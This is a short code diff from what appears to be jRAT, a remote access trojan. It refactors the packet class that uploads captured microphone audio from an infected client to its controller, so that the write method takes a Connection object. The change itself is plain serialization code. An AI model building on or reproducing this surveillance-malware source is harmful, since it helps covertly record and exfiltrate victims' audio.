@@ -1,7 +1,6 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 
 
 public class Packet58ClientUploadSoundCapture extends AbstractOutgoingPacket {
@@ -17,10 +16,10 @@ public class Packet58ClientUploadSoundCapture extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeInt(quality);
-		dos.writeInt(read);
-		dos.write(data);
+	public void write(Connection con) throws Exception {
+		con.writeInt(quality);
+		con.writeInt(read);
+		con.write(data);
 	}
 
 	@Override
